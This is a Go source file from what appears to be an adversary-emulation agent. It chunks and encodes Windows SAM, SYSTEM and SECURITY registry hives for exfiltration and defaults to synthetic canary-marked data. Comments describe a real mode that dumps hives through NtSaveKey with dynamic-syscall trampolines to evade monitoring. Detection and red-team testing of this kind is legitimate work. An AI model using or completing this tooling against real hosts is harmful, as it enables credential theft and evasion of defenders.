// Package registrywin provides Windows registry hive extraction for the ADVERSE agent.
//
// Chunk wire format (raw bytes before base64):
//
//	u32 seq BE || u16 hiveLen BE || u16 pathLen BE || u32 dataLen BE || hive name || registry path || data
//
// Extraction modes:
//   - Synthetic (default): in-memory regf data with CANARY markers. No filesystem
//     telemetry, no privilege required. Selected whenever real_mode is false.
//   - Real (Windows-only, real_mode=true): NtSaveKey to a
//     temporary file with FILE_ATTRIBUTE_TEMPORARY, then NtReadFile into memory.
//     The read handle opens with FILE_FLAG_DELETE_ON_CLOSE, so the I/O manager
//     deletes the temp file when the handle closes (crash-safe; no manual
//     cleanup dependency).
//
// HONEST RESIDUAL RISK — kernel telemetry observes all real extraction operations:
//   - CmRegisterCallbackEx (Sysmon 12/13/14) fires on NtOpenKey, NtSaveKey
//   - File-create telemetry (Sysmon 11) fires for the temp file
//   - ETW-TI kernel provider monitors registry + file operations
//   - MDE behavior monitoring / Defender AV observes all
//   - Transient MFT/USN create/delete records exist during the dwell window
//     (delete-on-close removes the file; the records themselves remain and are
//     forensically recoverable — residue, not absence)
//
// REAL EXTRACTION is compile-gated to //go:build windows.
// On non-Windows with real_mode=true, Extractor.ExtractHive returns a clear error.
// All NT API calls use dynamic-SSN trampoline path — no hardcoded SSNs.
package registrywin

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"
	"sync"

	"github.com/ashwnn/adverse-go/internal/audit"
)

// Chunk represents a chunk of registry data for exfiltration.
// Wire format: u32 seq BE || u16 hiveLen BE || u16 pathLen BE || u32 dataLen BE || hive || path || data
type Chunk struct {
	Seq          uint32
	HiveName     string
	RegistryPath string
	Data         []byte
}

// Serialize converts the chunk to the wire format bytes.
func (c *Chunk) Serialize() []byte {
	hiveBytes := []byte(c.HiveName)
	pathBytes := []byte(c.RegistryPath)

	size := 4 + 2 + 2 + 4 + len(hiveBytes) + len(pathBytes) + len(c.Data)
	buf := make([]byte, size)

	binary.BigEndian.PutUint32(buf[0:4], c.Seq)
	binary.BigEndian.PutUint16(buf[4:6], uint16(len(hiveBytes)))
	binary.BigEndian.PutUint16(buf[6:8], uint16(len(pathBytes)))
	binary.BigEndian.PutUint32(buf[8:12], uint32(len(c.Data)))
	off := 12
	copy(buf[off:], hiveBytes)
	off += len(hiveBytes)
	copy(buf[off:], pathBytes)
	off += len(pathBytes)
	copy(buf[off:], c.Data)

	return buf
}

// Deserialize parses bytes into a Chunk.
func Deserialize(data []byte) (*Chunk, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("chunk too short: %d bytes (minimum 12)", len(data))
	}

	seq := binary.BigEndian.Uint32(data[0:4])
	hiveLen := binary.BigEndian.Uint16(data[4:6])
	pathLen := binary.BigEndian.Uint16(data[6:8])
	dataLen := binary.BigEndian.Uint32(data[8:12])

	expected := 12 + int(hiveLen) + int(pathLen) + int(dataLen)
	if len(data) < expected {
		return nil, fmt.Errorf("chunk truncated: need %d bytes, have %d", expected, len(data))
	}

	off := 12
	hive := string(data[off : off+int(hiveLen)])
	off += int(hiveLen)
	path := string(data[off : off+int(pathLen)])
	off += int(pathLen)
	chunkData := make([]byte, dataLen)
	copy(chunkData, data[off:off+int(dataLen)])

	return &Chunk{
		Seq:          seq,
		HiveName:     hive,
		RegistryPath: path,
		Data:         chunkData,
	}, nil
}

// ResultPayload is the JSON payload for a result message (as a Go struct for building).
type ResultPayload struct {
	JobID   string `json:"job_id"`
	Hive    string `json:"hive"`
	Seq     int    `json:"seq"`
	Total   int    `json:"total"`
	SHA256  string `json:"sha256"`
	DataB64 string `json:"data_b64"`
}

// BuildResultPayload builds the result payload JSON string for a chunk.
func BuildResultPayload(jobID, hive string, seq, total int, rawBytes []byte) string {
	hash := sha256.Sum256(rawBytes)
	rp := ResultPayload{
		JobID:   jobID,
		Hive:    hive,
		Seq:     seq,
		Total:   total,
		SHA256:  hex.EncodeToString(hash[:]),
		DataB64: base64.StdEncoding.EncodeToString(rawBytes),
	}
	b, err := json.Marshal(rp)
	if err != nil {
		// Should never happen with simple string/int fields; fallback to empty object.
		return "{}"
	}
	return string(b)
}

// ExtractorConfig configures registry extraction.
type ExtractorConfig struct {
	Hives     []string
	ChunkSize int
	RealMode  bool // real extraction is Windows-only
}

// Extractor provides registry extraction capabilities.
type Extractor struct {
	mu        sync.RWMutex
	config    ExtractorConfig
	canary    string
	extracted map[string][]byte
}

// NewExtractor creates a new registry extractor.
func NewExtractor(config ExtractorConfig, canary string) *Extractor {
	if config.ChunkSize <= 0 {
		config.ChunkSize = 1024
	}
	if canary == "" {
		canary = GenerateCanary()
	}
	return &Extractor{
		config:    config,
		canary:    canary,
		extracted: make(map[string][]byte),
	}
}

// ExtractHive extracts data from a registry hive.
// In synthetic mode (default), generates regf+CANARY data in-memory.
// In real mode, requires Windows.
func (e *Extractor) ExtractHive(hiveName string) ([]byte, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if e.config.RealMode {
		return e.extractReal(hiveName)
	}
	return e.extractSynthetic(hiveName)
}

// extractSynthetic generates synthetic regf data with CANARY marker.
//
// Ownership/zeroization: audit.GenerateSyntheticHive returns two independent
// copies — `plain` (ordinary heap, unlocked) and `sb` (locked copy). This
// method validates and mutates `plain`, then frees `sb`, which zeroizes only
// the locked copy. The `plain` slice is retained in e.extracted and returned
// to the caller: it is the synthetic exfil payload and by design is NOT locked
// or zeroized automatically. Callers that need it zeroed must do so
// themselves via audit.SecureZeroBytes once serialization is complete.
func (e *Extractor) extractSynthetic(hiveName string) ([]byte, error) {
	plain, sb, err := audit.GenerateSyntheticHive(hiveName, 1024, e.canary)
	if err != nil {
		return nil, err
	}
	defer sb.Free()

	if err := SyntheticHeaderValid(plain); err != nil {
		return nil, err
	}

	// Inject hive-specific markers with bounds checks to avoid panic if size changes.
	switch hiveName {
	case "SYSTEM":
		if len(plain) >= 88 {
			copy(plain[80:88], []byte("BootKey:"))
		}
	case "SAM":
		if len(plain) >= 89 {
			copy(plain[80:89], []byte("UserNames"))
		}
	case "SECURITY":
		if len(plain) >= 87 {
			copy(plain[80:87], []byte("Policy:"))
		}
	}

	e.extracted[hiveName] = plain
	return plain, nil
}

// ExtractChunks extracts registry data and splits into chunks per the task request.
// chunkSize must be > 0; the exported method validates this itself rather than
// relying on callers (a non-positive value would otherwise loop forever).
func (e *Extractor) ExtractChunks(hives []string, chunkSize int) ([]*Chunk, error) {
	if chunkSize <= 0 {
		return nil, fmt.Errorf("chunk size must be > 0, got %d", chunkSize)
	}

	var chunks []*Chunk
	seqNum := uint32(0)

	for _, hiveName := range hives {
		data, err := e.ExtractHive(hiveName)
		if err != nil {
			return nil, fmt.Errorf("extract hive %s: %w", hiveName, err)
		}

		for i := 0; i < len(data); i += chunkSize {
			end := i + chunkSize
			if end > len(data) {
				end = len(data)
			}
			chunks = append(chunks, &Chunk{
				Seq:          seqNum,
				HiveName:     hiveName,
				RegistryPath: hiveName,
				Data:         data[i:end],
			})
			seqNum++
		}
	}

	return chunks, nil
}

// GetExtracted returns a copy of all extracted data.
func (e *Extractor) GetExtracted() map[string][]byte {
	e.mu.RLock()
	defer e.mu.RUnlock()
	result := make(map[string][]byte)
	for k, v := range e.extracted {
		cp := make([]byte, len(v))
		copy(cp, v)
		result[k] = cp
	}
	return result
}

// GenerateTempNTPath builds a Windows NT path for a temporary hive extraction file.
// Pattern: \??\<tempDir>\~AD<hex8>.tmp
// The 8-hex-char suffix is randomly generated for uniqueness.
func GenerateTempNTPath(tempDir string) string {
	b := make([]byte, 4)
	rand.Read(b)
	suffix := hex.EncodeToString(b)
	return fmt.Sprintf("\\??\\%s\\~AD%s.tmp", tempDir, suffix)
}

// GenerateTempGoPath builds a Go-native path (forward slashes) for testing.
// Pattern: <tempDir>/~AD<hex8>.tmp
func GenerateTempGoPath(tempDir string) string {
	b := make([]byte, 4)
	rand.Read(b)
	suffix := hex.EncodeToString(b)
	return filepath.Join(tempDir, fmt.Sprintf("~AD%s.tmp", suffix))
}

// ValidateRegfHeader checks that data starts with the "regf" magic bytes.
func ValidateRegfHeader(data []byte) error {
	if len(data) < 4 {
		return fmt.Errorf("data too short for regf header: %d bytes", len(data))
	}
	if !strings.HasPrefix(string(data), "regf") {
		return fmt.Errorf("missing regf magic header: got %q", data[:4])
	}
	return nil
}
